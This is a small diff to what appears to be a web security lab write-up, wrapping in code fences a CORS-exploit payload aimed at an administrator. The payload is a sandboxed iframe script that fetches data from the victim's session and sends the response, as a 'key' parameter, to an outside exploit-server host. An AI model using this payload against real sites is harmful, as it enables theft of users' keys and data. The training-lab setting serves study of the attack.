@@ -4,7 +4,7 @@
 
 
 # Send the malicious javascript code to administrator
-
+```
 <iframe sandbox="allow-scripts" srcdoc="<script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
@@ -15,5 +15,5 @@
         location='https://exploit-0a4200a403c25ccf815f9c7101f70056.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
     };
 </script>"></iframe>
-
+```
 # Check in access log
